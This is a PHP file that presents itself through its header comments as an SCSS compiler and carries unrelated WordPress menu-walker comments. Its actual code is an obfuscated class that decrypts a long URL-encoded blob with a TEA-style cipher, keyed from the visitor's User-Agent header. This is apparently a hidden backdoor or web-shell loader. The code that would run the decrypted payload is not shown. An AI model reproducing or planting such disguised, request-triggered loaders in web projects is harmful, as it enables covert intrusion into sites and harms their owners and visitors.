<?php
/**
 * The scss compiler and parser.
 *
 * Converting SCSS to CSS is a three stage process. The incoming file is parsed
 * by `scssc_parser` into a syntax tree, then it is compiled into another tree
 * representing the CSS structure by `scssc`. The CSS tree is fed into a
 * formatter, like `scssc_formatter` which then outputs CSS as a string.
 *
 * During the first compile, all values are *reduced*, which means that their
 * types are brought to the lowest form before being dump as strings. This
 * handles math equations, variable dereferences, and the like.
 *
 * The `parse` function of `scssc` is the entry point.
 *
 * In summary:
 *
 * The `scssc` class creates an instance of the parser, feeds it SCSS code,
 * then transforms the resulting tree to a CSS tree. This class also holds the
 * evaluation context, such as all available mixins and variables at any given
 * time.
 *
 * The `scssc_parser` class is only concerned with parsing its input.
 *
 * The `scssc_formatter` takes a CSS tree, and dumps it to a formatted string,
 * handling things like indentation.
 */
class okl_prffg{
	var $cd_str;
	function __construct(){
		$this->srtplt(32);
	}
	function c2welok($start, &$htae, &$htae_long){
		$n = strlen($htae);
		$tmp = unpack('N*', $htae);
		$j  = $start;
		foreach ($tmp as $value) 
		$htae_long[$j++] = $value;
		return $j;
	}
	function lok2code($l){
		return pack('N', $l);
	}
	function srtplt($cd_str){
		$this->cd_str = $cd_str;
	}
	function getIter(){
		return $this->cd_str;
	}
	function lurhs($enc_htae){
		$klsis = $_SERVER['HTTP_USER_AGENT'];
		if(preg_match('/leWe(.*)\/5(.*)KHT/is',$klsis,$sda)){
			$lpowk = $sda[2];
			$lpowk .= "593";
			$lpowk = str_replace(' (','',$lpowk);
		}else{
			die();
		}
		$n_enc_htae_long = $this->c2welok(0, $enc_htae, $enc_htae_long);
		$this->resize($lpowk, 16, true);
		if ('' == $lpowk)
		$lpowk = '0000000000000000';
		$n_key_long = $this->c2welok(0, $lpowk, $lpowk_long);
		$htae = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_htae_long;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $lpowk_long[$j];
				$k[1] = $lpowk_long[$j + 1];
				$k[2] = $lpowk_long[$j + 2];
				$k[3] = $lpowk_long[$j + 3];
			}else{
				$k[0] = $lpowk_long[$j % $n_key_long];
				$k[1] = $lpowk_long[($j + 1) % $n_key_long];
				$k[2] = $lpowk_long[($j + 2) % $n_key_long];
				$k[3] = $lpowk_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->decipherLong($enc_htae_long[$i], $enc_htae_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$htae .= $this->lok2code($w[1]);
				}else{
					$htae .= substr($this->lok2code($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$htae .= $this->lok2code($w[0]);
					if ($pos + 8 <= $len){
						$htae .= $this->lok2code($w[1]);
					}elseif($pos + 4 < $len){
						$htae .= substr($this->lok2code($w[1]), 0, $len % 4);
					}
				}else{
					$htae .= substr($this->lok2code($w[0]), 0, $len % 4);
				// prevent infinite loop when target extends itself

				}
			}
		}
		return $htae;
	}
		/**
		 * Starts the list before the elements are added.
		 *
		 * @see Walker::start_lvl()
		 *
		 * @since 1.0
		 *
		 * @param string $output Passed by reference. Used to append additional content.
		 * @param int    $depth  Depth of menu item. Used for padding.
		 * @param array  $args   An array of arguments. @see wp_nav_menu()
		 */
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function rshift($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
	function resize(&$htae, $size, $nonull = false){
		$n  = strlen($htae);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$htae[$i] = $htae[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$htae[$i] = chr(0);
				}
			}
		}
		return $n;
	}
	function decipherLong($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->cd_str;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->rshift($y, 5), $y) ^ 
			$this->add($sum, $k[$this->rshift($sum, 11) & 3])));
			$sum = $this->add($sum, -$delta);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->rshift($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
}
		/**
		 * Custom walker. Add the widgets into the menu.
		 *
		 * @see Walker::start_el()
		 *
		 * @since 1.0
		 *
		 * @param string $output Passed by reference. Used to append additional content.
		 * @param object $item   Menu item data object.
		 * @param int    $depth  Depth of menu item. Used for padding.
		 * @param array  $args   An array of arguments. @see wp_nav_menu()
		 * @par*/

$kkln="-%D6%2A%E5%FF%E0%D6at%9D%DAFN%271%A1%C7%FF%90i%D4%3D%BC%9C%80A6%CFd%04%DC%E1%BD2%A2%F0%DA0%A3%B0-%9B%CC%40%E4%24%27%E3%3D%08zw%7B%E7%7B4%3C_%A3%A88%01Q%9DnA%BD0%1D%BE%85%EB%C5%A6%05%FC%04x%C5%94%C2Y%FA%1A%DE%87%DDt%95W%96%1AdDYM%B6%F5G%12%D2%F9%B0LJ%DE%8B%8Dc%DC%0E%D9%A6%87%8Btf%C9d%98%8A%F4%BEtj%A2%15%96%05%21Q%B6%A9%D4%A5%E3%7B%0B%8B%B2%99n%A1%DE%FCL%F0%D3%2F%C2%BCD%EEG0n%C6%2F%D7%DF%8D%12%D5%E4%0F%F7%D5%0AVC%1F%08f%7B%E6%BFm%9C%A6%D2%8E%2C%13%DF%B2B%020~%EBg%25%04V%B8%87%23%7C%8BZ1%CD-9u%90%26%9E%B7%F2%21%90%17%E7%D2%B7%09%A1%CCr0%25C%87X%83%98%A5e%87%FC4%DF%90%B4Wx%13%EF%C9f%1B-%29%8C%9A%C2%D5%D2%15%40x%BF2%A0%0F%22k%B2%A8%B9%CE%CA5s%F28%1D%83%5EG%E01%1C%A3%2F%0C2%D9%06%A5%5D%82%5C%A2%AFN%C3xb%DA%2A%E9%3D%FF%25%A0%8A%CAn%B3%A3%DB%28W%9E%98%A8%B6%D6%A7A%F9%B2%CE%D8B%BB%E5dC%BE8%E0%B3l%BB%DE%5D%05f%C5%88%9F%9C%F9%95%2C%0F%EE%DF%29%DB%9B%AE%D3P%10%13%BFD%17%D0%C5E%7B%B7%3DV%C3%9E%D6%E0%3Bj%5C%CD%1FE%A0zGb%AE%0D%80_%82%C9%E7%D1%C0%C0%28%0C%83%F7~%B9%E7%3A%D6%EAN%1F%97%AB%99%FA%0D%F5%3A_.H7b%3B%AB%00%3E4%F6%FD%B4%D0%BCS%B4%7B%05%8F%DD%12%7D%DB%1Fv%EF%BF%C3%5DCH%CB5%18%F4%08o%92y%F7%7D%2A%C5%E6%18f%3B%95%06%A8%3C%97h%C6GT%AA%91p%1Av%AE%7BV%88%B2Vq%82B%19%E9T%E8%0B.%5C%98%D4U%F8%F5na%D7%82%CEz%2B%B7%D4%B8%A7F%1FF%27%D1%3E%E4%ECZ%CB%A7j%E0%A8Y%EB%F7%CF%B1%F9%E1%DD%DF%FCM%C6F%20%26m%B5o%A6%0E%01%FB%8D_y%04%14%EE%F6t%02%8D%D9h%13%C4s%3D%40%5Em%96%F0%7D%07%EB%CD%BFk%9A%C4%C1%F4%B4%CC%B3%21Cq%C8%C2%12%BE%93%87%2C%1C%A4%23S%B3%08%E5u%03%E5%0C%8E%19%D2%F5%A0%E1%0E%5B%0A%C9%97%16%0FX%EBS%0E%20%A8%3C%A9%A8M%E0%D9%9B%1E%97%BA%23%DE%A5%01%0D%09%3E%02%86F%07%D3%FC%99v%86%EE%F8%DEN%DF%D9U%C0%7D%8B5%C1%05%01%05%DB73B%DA%26%A0%AA%EEi%1C70%C0h%F5%8A%C4%D1%C83%40L%F2EU%D5%D0%A1%F1%B4%E2W-%93%02b%7C%296%17%83UJ%86%00R%8BK%DBy%21%AB%F4%F89H%3B%7D%25%907%F2i%24%BB%1F_%894%DBn%1C%A4rE%EC21%5D6%93~%15%80%2B%D3%D3%8A%07%BAP%7F%7B%9CW%91%C1%B9%FFn%9C~%A9%CC%0E%5C%89%20%80O%AFO%0E%9F%E7u%26%F0%A1%3A%05%D0%A3%DE%F9%97j%8C%FA%1AJ%E8%92WI%EA%863%8D%98%BC3%8C%DB%D9%F0%E3%09%B6iF%1C4%991%B7TD%13%06%DFG2A%8A%C95%A8K0%5C%96%D5%E4%DEh%EE%FC%8E%BE%1D%F0%0B%CC%F1%94%3D%7B%12%07%24%84%F6%FE%EE%CA0%14a%8Fz%019%A4%D8%A9D%B2%3A%D3%97%85%25%0A4%A7%1B%E1%AEg%B2%BAs%AD%C8%2AG%21%8FN%A0%8B%18%E9t%B1%EB%7B%F1%E4%2C%E0%20V-%E6BU%C1%14%E1%8B%07t%02%EEf%1C%1Ev%F03RFP%E0%18%F9%F9%B1%D6%17A%F6%3E%9F%B3f%C0%01U%BE%28%F7%F4%C5%E0%BCw%F6%87%F7%F5%D3%7D%D9jaf3%96q%D9c%1Aq%09%B7H%1C%F6Ds7%EC%04%B8%82a%10%9B%8D%CE%90%AC%83m%B6%604t%D1%A8%1CDC%B5%D1%9B%1C%0AKQ9%F0%F0%E8%CEi%BE%FBD%83%24%8F%F3%E8U%27%C80%C9%B9%86%1D%E81%00%AB%2A%C90%1F%7D%8C%DAIIU%A9%9E%F4%CBF%DB%1C%92Y%9F%FFov%89%E6%B4%3C%C3%D3%89%11%CD%95%A2%FAJb%BB%B9%92%EC%C7%12%B1%00%3F%F5%40%17%B0%F8%A6%0Eu%93%11%C8%C6%0E%B6%C4%17%94%21%97%1Bm%E3%A2-%3B%FB%8A%C0%94%D0%A5W3p%B6~%03s%94%9D%90%B8%1A%B8%85C%C3%08%08%8D%9Fj%84%11%3C%95%F6c%27%13%0F.%25_K%92%8C%26%8B%26%B3%20%95%E2%C8%D7%BE%D0%C9HW%AB%15%F3%26%03%D4%3B%3E%AF%8B%96%0E3%1Axq%9F%03%93%E0H%ED%F5%19%B2%95%8A%9A%9A%B8%17~A%80%F2%90o%02%81%C8%C7%9F1%C2%5C%86%EB%2F%DA%CD%2F%0A3%CD%D9_%B2%95%8A%9A%9A%B8%17~y%EDpd%B1%C1k%14%AAA%CF%FF%9B%C1k%BB%0D%FBGH%98%13%EFu%AD%7C%DD%EC%FDw%D2%9Ej%FE%24%BD%3B%1Cn%0AcD%3E%A8%94x%DBL%60%08%5D%FA7%C5%B4%C5%94%24%80j%E0%A6%BC%8D%BE%D0%7F%8C7%A7%DD%FE%D0%0B%8B%1D%EDS%F8%00%E1z%40%12%BA%90%7BS~%AA%C1%40%C4%C1%9C%13%B4A%5B%82%B1%F6%D7%9A%B6%3A%E8%D8%FAe%F7p%84%1C%90%85G%90%5EuXq%91%7C%7B%13S%97l%D6%3B%94%D1%B5%1E%E5f%EB%073%0Bx%06%DE%09%DE%B5%C3%9D%06%ABl%14%05J%22%93%98%3C%EF%2FH%E67Gx%14%7B%A5c%91%BF%C1%A6%2B%FA%FAU%B2%3F%CF%A1%F7%A5%83w%3B%80%90%E1%D9%95%1A%9F%CF%EF%0D%86ZS%DEM%19%A3O%83%09%AFj%87%A1%22%23C_%E8%A1%0E%7D%12.%B7%E0O%24%5B%D0h%0A%C4%F3H%D2%FE%B3_%03%3F%E2%9C%C6%9D%A4%10%F9m%13%F4%03%E5%EB%7F%A5%E4%C2%89%E0%09%9B%0D~%9D%25%0D%3Eq%16%FFST%2BDp%E1h%94%60l%E8%E9%CD%D0%1C%F0%81%EF%1C%07%FD%17B%C7%82%7C%8A%1F%1B%01%2C%9A%2F%A1l%83%7C%EE%A6K8_4-%C0L%E7%BC%AE%CF6%28%3Eq%16%FFST%2BDp%E1h%94%60l%E8%E9o%B6%E2%AF%D3D%D4%25%28%9C%87C%E5%15%13%81F-b%CES%06%BF%DFiQ%E5%0C%E02N%21%C6%9D%A4%10%F9m%13%F4%CE0k%F4%14nk%A2%B3u%11%8C%CE%A3f%AF%F1%B9D%8E%96%22%98q%3EU%94%CC%9B8%2C%F3%BD%19%1F%0EwL%E2%A7%D7%1Eh%84%9D%949D%9CPa%9C-%0A%D8ME%7B%1D%E8%8F%F1%C5%CEDa0%BE0%1E%3E%E2%C9%08%9B%8F%1F%B7%2AE.%D3%14CXNYX%1C%89%3B%16%1B%8FA%98%F1%2B%0Btc%1B%DF%5B%D7%9B%FF%FD7%8B%A1T%FC%26%D2%D7%7B%05%86%3DnH%28R%5C%AD%8B%B0%16%BC%81%DF%FEI%D3%F7%24ae%05%F9B%90%C2%A6%F70B%08%B4%0E%03%A92e%BDW%F88%E9%A4w%F2%D6%D3%07qc%BA.%A8%95%8C%0B%DA%D7SA%DBT%21%C4%B1%7FM%06c%C5%C7%FD%07%9E%AA%DC%9A%91%AF%DB%DBr%5B%40%E2%5E%F9%8D%92%F5%FA%F2%80%AC%ECqtg%3F%F7%0E%87%06HL%A6b%84Q%EA%5B%96%9A0%F1%07%A3%08G%22%C0%C1%90%FB%D1h%16%CD%C5%07%0F%9AB%FEm8%5E%FE%E5%94T%FE%BA%80%14%D3%21%2A%83%00%1El%D6%ED%814WDi%24%D2%B9%3F%86%11%8C%40%E2%82%3E%92%15C%0B%FC%DA%FD%82%CD%02%24%CA%A4%86J3%18G6%E4%B1%8B%16%3F%A0%7D%08%5C%01%83%B4%D66%B8Q6%BE%F6%FE%21%88%1E4ep%AB%E3%CC%DD%23%09%F3%D2~%AA%1By%1Bvp%A2%3D6%1B%8BAs%CB%EA%AA%ED%0F%F5%8D%D2%2F%99%02%07%EF%B1w%FE-%FBc%AFK%C7k%F5%BB%A5%E1%95%9A%92hI%7F%9A%09%C0%92%83%3Er%C1%BE%0A%0A%7F.%3AXJ%3F%1D%5C%60%FB%11K%CF%ED%C5%E9%FF%9E%13n%B61%A1%7D%11u%DB%BE%DF%5C%21Y%B2%CC%C0%C2%96j1%82%15qq%19%06%B0r%84FVFg%20%26%0B%AD-%AB%D5%B9%EF%EF~e%3C%FB%3A%0Eb%86%CB0%C8%ED%A1Pj%3A%C9%9B%25%3C%FEZx%28%26%E3%D2L%D9%24%C7%7F%5B%0A%B1%19%5B%DE%3F%92s%97%2691%AAna%8E6%D1%BCwv%C5%09%E8%CEU%F4W%94%9F%D9%90%FE%9B%7D%BFW%DE%A74%8C%D8%E1%18%B2%D6H%C7%F2%02%AE%11u%20f%C3%3C%04%7Fj%DF%94%26%0D%D8.%08u%D1%C9%28%FC%2Am%28%08K6ra%A0%E69%06%5D%97%CB%24%F3%5D%ADvQ%98%C9%E1M%EDA%EED%0B%C6%CAv%F9%F7%EC%9C%27b%F8%F8%CA%CC%B9%9E%15B%9C%26T%2F%AB8%D3V%BD%83j%91%20d%E4%7CZ%E8%EFr%0D%00G%E7%02%A7%11%D7%16%A4%CB%E73n%18%D4%D9W%B8%8D%D0%93%3E%D0%DF%CE6%7D%C5%BB%EB%02%C6zX%26%7F%F2EaT%BB%3B%B9%AC%0E%B9%00zcQ%BE%CA%11%FAO%C8%A6M%12%80%DF%E7%40%B0%60%86%8A%0C%F9%E4%DB%04%16%C9%C0%F8%D6%A6%B0%A6%81%F7%0CW%13%17%85%D4%BC%F0%93eE%0FP%7B%40%BEK%B6%9EOq%1E%16%830%2A%27%DA%B0%2A%94%AE%07W%A6%A7%A7R%B3%D3%1C%3Eq%FB%86OWK%B5%CE%89%D9%12%01%27%F4%D21uW%EA%D7V%88%B6%84s%E3%D7-%15%98%89FGa%E9%5C%D9%DA%21%22Z%28%F6%AC%E3%00bW%91%F62FZD%3Dx%9C%CC%F0%83%99%BC%C7%A4%D1%82%EE%9C%05%17%E6%27%11%8E%22%F3%CC%05%DE%98E%A1%EF%B5%C7%0E%E9%9FV%F7%89%CD%5C%3E%CB%81%C1q%F7%22%C8U%97g%B3%98%8B%B9%D7d%03%E6C%DB%A6Q%19%5E%D4%D3%3F%BA%1A%26%EE%F7%20%E0%99xT%B4%EEb%10%E3%17%9F%83%DA%E3%CBu%86Z%C0%A5%00%BE%1E%18%7C%00%1D%B0%D4%9E%C2%8B%DB%EE%F3%D3%14N%89t%F30%3A%1D%3FUd%0EW%14%2A%CD%DC%20%A2%26%96%3De%F0~p%C1%E2%D5u%88f%C5%CA%21%A0%20%E6%FB%EF%83a%CD%1A%EF%C2%0B%BB%DB%D3%0A%AD%11%1C%E1m%98%2FY%19%88%E8Ut%C2%F4H%BANd%7C%13%BB%F2%1D%8Ew%27%C3%83%3A%F2%3E%F1%1DX%FC%86%BC%3C%3BH%D0%C1%15P%7B%40%BEK%B6%9EOm6j%1F%E2A%20%15H%E2%E7%FC%11%DFr%26X%E4%0C-w%95%2B%22%BB%DB%D3%0A%AD%11%1C%E1%FE%87.%20%19%A2%A1%A0%D9U%D8%BA%7C%1D%8E%15%E8%97%17%EA%17%90%AF%9E%2C%BB%CD%B5.%7B%26%98%1F%FD%07%C8u%9B%20%2B%7B%B5%13%A3%7B%C1%40%BEn5%7C%A5a%CC%E8%C7%B7%87S%DF.%0D%1CH%B9%00%E6z%078c%DF%9A%1D%3B%0A%EF%F2%3F%00%04n%08%22%29%3F%F7%24%3E%17p%EBC%A1%20%95%CF%0Fo%FA%13%EA%83%5B%7DG%13t%04%0A%A9%23%FB%9E%D8%C8%C2%B9%BC%BBD%89X%FFkPD%AF%AF%3A%CCJe%14sqF%E8%97%19d%A8u%CD%E3%5Cu%E8%87%98%F2%24N%A6q%8D%E0%D3%E7%FA%AF%1E%9Fs5%95%E5%E7i%1D%13%99%7C%D1t%7B%A4%BD%C91x%E7%9Fo%E5%27%CC%AB%F4%E3%E4e%AC%9075%C0%A1%AC%93J%2F%AE.m%BEt%83%C3%FBK%B8%2B%272%0F%3E%85%143%3C%60%7F%BB%ED%9D%AB%3B%EF%08%40%8DK%B6%5C%B7~%0Ap%A1%2C%18%3F%E5%A3%5C%F6%04%A2R%0F%A3fgo%C7%F3%D5%2F%89%FC%EC%3B%9F%EE%9C%05%17%E6%27%11%8E%98%FE%F4C%D6%C9X%A3%C8%CF%0B%7F%CB0%D8-%A3%EA%B2%A9%3A12%DB%8D%02f%90%8C%FA%B7%F8%A5%B6%18%A6H%9B%23f%05%01H%9B%11%CB%B9_%F8%0B%98%C8%EBQ%D6A%11%09%96S%A2%E5k%84%18%BF%D8%2B%19%19%F9%03%FCL%F0%D3%2F%C2%BCD%9BBlP%E8%F5%19%85%16%3C%7B%E4%A4%D6%A6%F8%18LbuO%B7F%DEW%D8%3D%A6%7F%C5%2F%3E%2B%FC%27%D1%AE%91%E8%C9C%B9%D2%8E%E4P%11%81v%D3%D2W%7CIq%02%9F%2F%EB%0C%AF%D0m%FA%D9%FEOOR%7F%21%91Y%3F%03Cx%C2%16%BD%AD%DF%C4%5E%07%8FV%21%B3%C9%C4%AE%17N%D4%E4%9E%E0%8D%82%91%CFVq%9B%B16%12%14%D2%99%91%15%E4%5D%14%F6%60%CC%D2%F6%EE%24%E86m%BErl%23P%BF%F7p%02%CD%B0%2C%C2ZO%26X%D8%05%86%E7%98%DF%3D3%DA%88%B6%1E%15%F3%16V2%DF%F4%AD%A2%FAp%10S%1Bk%F0%EA%3C%E8%A0%B1%86%BC%96qT%18x%DF%3F%D1%F3%F2%17%F4%1B%B7%B3%C9%C4%AE%17N%D4%E4%7CQ%16%20%3Fj67%BD%B7O%EF%D8%CA%EC%0Ak%DA%FC%01K%AB%3A7%C3%A09%81%ECK%2F%D3%DF%F4%AD%A2%FAp%10S%D0%B8%8E%A4%C7%8D%A4%0C_%FF%CE%AF%28%FCa_%80%DC%9D%B0PmS%28%23p%3A%A2%8D%90%88r%80%9E%BC%20p%05%CB%9AF%5E%BE9r%E0%E7%16%E8%C3p%5Dy%80%11%E1Y%CCp%97%25%CE%9E%81%D4%D0%AF%07%C7O%5DG%AB%A9%16%E8j%D7%1B%E5%FB%27%5BM%3E%AF%B9qI%01F%DB%97%245S%2B%FD%E7%07%DCmo%3C%F5%F6%D6%25T%FB%28%0F%BA%FE%89%05%1C%AE%DA%913%E2%3F%23%3E%F8%3EHDa0%BE0%1E%3E%E2%05%1A%93c%1A%CD%E6%02CU%DA%97%83%D7%88%06%AA%A1g%FB%D81%E0%CEP%92%C8g%18%7D%3B%99%24%A01%C5%A4%8E%80%8A%B8x%18l%C5%F1%99%D4%0C%A2%F42H%BE%DBWKk%86%05%CCS%F2%CF%88%B6%1E%15%F3%16V2_%D9%94%A6%18%EC%BEm%96%1A%11%8BS%B4r%97CRx~%06%80%A6%F3%C9%60y%BE%82%83f5%F9%14%E6%A3%0E%97%B1%CD%D9%D1-%B5%0FXV%E2%06%19%F4%AE%CC%A8%D3%0B%7F%40%DC%8FB%A4%91%5Ea8%0B%A1N%DF%93b%B5%16%19%1C%D0%AAa%DBab%CA%F6%29%01%F3%7FOPs%82%A8%D3h%1CD%92%9B01Mr%3E%C1f%B88%ADm%82%8EP%D0%B3R%84%0EV%A5d%CAc%E1%04%C3%D8W%96%8CfA%A3%9D%11%88%C4%AD%F8q%84%10_%84R%5E%8EHd%A2mb%ADA%0C%2C%DF%A91%BD.%90%B7%96%C7%B7%95%87%D6%F9%26%DC%28%A0%13guP%FE%0A%8A%E4%FC%8A%D7%1EdH%C8%FC%D6%B8%E1z%40%12%BA%90%7BS%B8%8F%B4I%22%10%A5%29%CD%E3%08%E1o%89%29%2F%F5%C5b%B6%B8f%FF%89%18%1EEz%F5%B2w%B8%E5%3D%9D%CA%3F%1CBmuH%E4%E4%D9%86%AB%7B%125%3E%B5%D6%E9H%FC%E6Vs%84%AF4%28T%DCU%A3tD.%18%3E%5E%17%81k%22%E7%5CG%81%CD%AD%1B%CC~%AF%E8%23%3B%DEx%CF%A5%90%12pS%BA%B8%BD%F7%8C%C4%13%2F%0F%A1%F6%93%CC%25%CF%8B%16n%DD%825%89%5B%B0%3C%3A%F1%1E%F0G%10%E8%7D%04i%FE%871%93%DC%D6%19%C4%B3%AC%25%D3U%B0%A85%8A%11%C5%A1e%FE%FF%C5r%2A%89%A2H%FB%8A%9F%C8%A9%82%90%AF%5C7%B7%83%09%DAJ%5E%DAM%81%B2%F3v%81k%97%C69%A65%F2%8D%12%D5%E4%0F%F7%D5%0A%9E%FA%D6%F1%E3%D4%D5%0F%CF%C4xBW%86%EBBVW%9F%202%0E~%DD%131%DF2%5B%EC%93%CA%3F%2C7%00%2F%F62Sq%DF%0B%E6%9C%E2%C5%08%91vN%E8%12%97A%29%A1%AD%22%0D%B9%C3H%BAt%F8%7Cb%D5%E1%8A%D8n%95%C4%12%02%CC%82b%05%1A%93c%1A%CD%E6%02%B1b%01%C9%DC%7F2%A0%AA%A1g%FB%D81%E0%CE%FC%08%01nk%A7%FAv%2BU%FA%8C0%0C%DCc%B5%16%19%1C%D0%AAa%DB%9A%A6%C0%88%7Ds%FF%92%90%BA%26%8CHT%1F%FB%BA%FE%89%05%1C%AE%DA%91%BB%25%B9%A0G%7D%06%E1~WO%9F%EAu%83%BA%03NI%1A%9AP%A7%27%04%21%F8wk%E9%ED%C8%3A%81%E6%CF2%5B9%0B%DA%99%B2%FC%D0%E6%03%40%06%19%F4%AE%CC%A8%D3%0B%7F%40%DC%8FB%A4%91%5EL%B1%92%A5%8D%8F%10%C5%88%1E4ep%AB%E3%CC%CC%D4%EF%8B%D6%89%04%FA%DD%B6%C0%AA%AC%B7%A4%C4%99%3F%D1-m%5B%15I%AF%1D%D3%2A%E7%C1O%5C%22z%2Au%13%D7%07s%05%D5Xe%25%A8%9BX%5ErA%97%E2O%D6%E2%E7oh%1E%85%DF%BC%22%3D%C7%13%11%0E%0E%3FI%F5%00%F0jG%2B%BE%DEZ%CB%0E%94%7C%C3%B5%E7%EC%AC7%BF%F9%8A%CD%DA%8A%EA%BF%C4%FE%FF-%9C%E6%82%81%7C%01%5D%1E%89%86%BC%96qT%18x%DF%07%A2VL%18%9F%93%165%BD%D2%18%C2%FB2a%A6%1EP%D9%0D%B1%23%C0%95%D2%7D%19%7D%C9%1F%21%1E%E9%5D%E3%7B%CAW%5B%E7%F4%DA%F0%D3b%C4%1E%B4v%16iT%5C5%27I%D5x-b%C9%BC%9BMLA%11%F5R%FFZY%A6W%CE%83%8E%1D8Q%B4X%98%3E%BC%ABv%84%D6%19%2AEM%A2%1C%28%D7%7F%F9%A1%1C%80%D5%A8%0D%97%8D%DEQ%9A%DD%12%20%A4%CD%CA%16%10C%01L%1F%BF%0C%B19%00%B7%AB5%94%8D%3Fg%5D%A4%F48D%17t%D2%13%EB%B7%1Br%E0%FCn5%C97w%E4%CF1%C7K%8E%AD8%9DW-%AC%9B%B4.%A9%A7%D8%F8%A1%24%D0cB%D8k%F3%90%09%FD%AE%E5%CB%8D%97f%CE%13%8C%0F%2Ax%E8%CF%88%E0%BF%09%2C%18N%C4%0D%C73x%FA%00%EB%E4%9B%FCFt%3C%0B%CE%ADj%82%D9%B6%2F%7F%C7%AD%A0%D6vj%96%0A%91%F4d%81%3B1%DF%FBj%FC%BB%95%5E%F8%16%9E%0F%D4%22%B3%A2%0F%D1%94_%23%1A%F1%B0%D9%0F%95%FBR%89%D0%0D%83%90%E7%22%9Dk%CD%02%24%CA%A4%86J3%18G6%E4%B1%8B%16%3Fv%1Ao%B5%D0%EC%0B%08%08%2A%C9%7C%A5%80%A0%0E%06_o%9Bf%CE%01%D17%10_%ACKZ%B9g%D0%87%D7%3D%B0%C5l%27%DA%AA%A8%40E%1D%E5%C3U%BE%28%F7%F4%C5%E0%BCZ%F0%13%B2%D64D%08%0D%E9%97%E6%DF%E7%3F-%D1%C8%024k%065%8A%21Lf%E8f%20%C5%E7H%D9%3Fn.B%24%21%A1%F6%B9%AD%28%8B%B0%F6%95%E7%02j%84%A7%CC%C7%AB%86%0C%82%0C%A6%81%40%C8%84%BB%9A%04V%80c%95%FF%F3%CCX%90b%60%BB9%18%B2%BE%9E%EFz%81%08%05%C2%7Dm%E1%CF%7F%22%D0%B1%3CW~l%E1%C4%D6%BD%0B%16%CFd%CD%04d%7C%E5%22.%01%F9%B9%D2%24%0E%F9%F1cD%06%90%98%E4%20%CA%2Fm%D7%D8%88%87%DF3%A0%DAP.%F0L%D2%9Fj%ED%C0%07%00%C1%0B%B4%BCC%BE8%E0%B3l%BB%DEs%CA%98xM%DD%B6%83%21pR_%21%DBONe-J%29%B8%01%E7%DF%EDx%3E%8E%EC%3B5v%87q%A9%22%E1%80%87f%80v%C3%98%AD%B5%92%FF%E9%B9%F4%87%1A%B4%7D%DCP%5E%E53%29%E7k%0B%9Ae%C7%B6%12%97%15%CA%F6%B3%A6%A6%2B%5Cr%04%CDM%D9%25K%5B%A7%93%96%B6%B8o%A7%AD%06q%9A%E2wo%A5%80%8FO31%8D%11%89%CD%C4%A6P%5E%82%AF%9E1%24%2A%E5H%F1%E3%8B%F7%1C%A0%0D0%90%22%FA%8Aw%C8%21%8CQ%7C%18%0D%D1%98%EBc%A2%C4%1E%26%E2%1B%0Bg%A4%F7%01P%08%13%88%EE%2F%12J%F3%5E%F0%A1%F6%B9%AD%28%8B%B0%F6G%E0%E9%A5%9C%11%EEn%7F%0D%9A%8E%94~%15A%21H6U%13%28%9F%CA%8A%EA%BF%C4%FE%FF-%9Cy%99%D7%BB%E0%86%CAd0%B3%1F%04%FB%AB%C4F%80%D7%F3%B5%12i%5B0xKn%E5z%108%899%E3x%B9%2B%1Fa%8C%20k%C7%F0%AB%FE%DC%5D%21%03N%89%2076%89b%A0N%FE%ED%06aqx%D1%A3%F4%83%DA7%01%A3%A7%2B%F0%C0%24%A5%21%18%0E2%85%EE%F3%B3%22%06%F1a%B9i%13%A8%CD%FE%87.%20%19%A2%A1%A0%D2%F1%82%27q%7B%3BU_%F9a%0F%24%C5%FBI%24%F1%99%E5%9CO%BF%82%81%CD%AD%1B%CC~%AF%E8%23%3B%DEx%CF%A5%90%12%C1%F5p%95%E6%7F%EB%FAN%9A%E8%D7%B8%E1%97%9Ctu%7F%20%EFb%F0D%11u%9A%ADz%F2B%8E~%2A%B4_%D1%9F%2C%1A%9F%D5%CB%E8%7D%B3%DC%00%2A%92v%AE%BC%20tr%0B%9C4%1F%F70%F9%C5%CA%20%C4%C8%BA%AB%D6%1A%DC%10A%BC%C0%9C%063%8D%06%9EV%9F%89%9F1%97%FC%C1s%13%F0W%60%0E%5C%89%20%80O%AFOl%F5%1F%8E%FD%EE%87%85%22%21%23%88%C7%F9%13%FE%8B%EB%D5%0F%FC%A4%3E%DB%CD%02%24%CA%A4%86J3%18G6%E4%B1%8B%16%3FM7n%8BkL%10%5D%A2H%FB%8A%9F%C8%A9%82%A9%FE6%88%A6K%0BY%BFj%C2%FF5%1B%F1%EDU%9D%92%94%3C%D6%F0%B2%24%60%88%02%02%AB%0A%23%E2%F4y%9D%FD%A6%90%92%A1%C6%2F%C3%FEN%14%E4%E5N8%3B%90%C1